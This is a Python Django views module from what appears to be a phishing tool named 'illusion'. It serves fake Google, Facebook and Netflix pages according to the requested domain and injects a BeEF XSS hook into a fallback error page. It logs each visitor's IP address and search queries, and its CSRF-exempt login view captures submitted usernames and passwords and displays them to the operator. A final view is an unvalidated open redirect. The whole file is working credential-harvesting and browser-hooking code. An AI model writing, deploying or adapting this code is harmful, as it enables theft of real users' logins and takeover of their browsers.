from django.shortcuts import render, redirect
from tldextract import extract
from django.views.decorators.csrf import csrf_exempt
from illusion.func import Google, Facebook, Netflix
from illusion.func import core
from illusion.func import BeefXSS


def index(request):
    user_agent = request.META.get('HTTP_USER_AGENT')
    WEBSITE = request.get_host()
    DOMAIN_NAME = extract(WEBSITE).domain + '.' + extract(WEBSITE).suffix
    core.new_client(domain=DOMAIN_NAME, ip=core.get_client_ip(request))
    template = BeefXSS('').hook_template('errors/mobile_no_internet.html')

    if DOMAIN_NAME == 'google.com':
        template = Google(user_agent=user_agent, is_mobile=request.user_agent.is_mobile).get_homepage()

    elif DOMAIN_NAME == 'facebook.com':
        template = Facebook(user_agent=user_agent, is_mobile=request.user_agent.is_mobile).get_homepage()

    elif DOMAIN_NAME == 'netflix.com':
        template = Netflix(user_agent=user_agent, is_mobile=request.user_agent.is_mobile).get_homepage()

    return render(request, template, {})


def search(request):
    user_agent = request.META.get('HTTP_USER_AGENT')
    Word = request.GET.get('q')
    client_ip = core.get_client_ip(request)

    core.print_info(domain=request.get_host(),
                    message=f'{core.MAG}{core.BOLD}{client_ip}{core.YELLOW}{core.BOLD} »» {core.RESET}searched about {core.YELLOW}"{core.BOLD}{core.GREEN}{Word}{core.RESET}{core.YELLOW}"{core.RESET}.')

    template = Google(user_agent=user_agent, is_mobile=request.user_agent.is_mobile).search(word=Word)

    return render(request, template, {})


@csrf_exempt
def login(request):
    WEBSITE = request.get_host()
    DOMAIN_NAME = extract(WEBSITE).domain + '.' + extract(WEBSITE).suffix
    core.new_client(domain=DOMAIN_NAME, ip=core.get_client_ip(request))

    if request.method == 'POST':
        fieldOne, fieldTwo = core.get_login_fields(WEBSITE)

        USERNAME = request.POST.get(fieldOne)
        PASSWORD = request.POST.get(fieldTwo)

        core.show_creds(domain=DOMAIN_NAME, data={'username': USERNAME, 'password': PASSWORD})

        return redirect('index')

    else:
        return redirect('index')


def redirect_to(request):
    if request.method == 'GET':
        url_to = request.GET.get('url')

        return redirect(url_to)
